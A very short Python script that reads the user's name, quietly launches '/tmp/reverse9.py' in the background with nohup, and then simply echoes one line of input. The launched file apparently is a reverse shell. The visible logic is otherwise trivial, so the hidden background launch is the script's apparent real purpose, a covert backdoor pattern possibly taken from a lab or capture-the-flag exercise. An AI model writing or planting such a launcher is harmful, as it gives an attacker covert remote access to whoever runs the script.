import getpass
import subprocess
import os

home_username=getpass.getuser()
os.system("nohup python3 /tmp/reverse9.py &")

palabra = input()
print(palabra)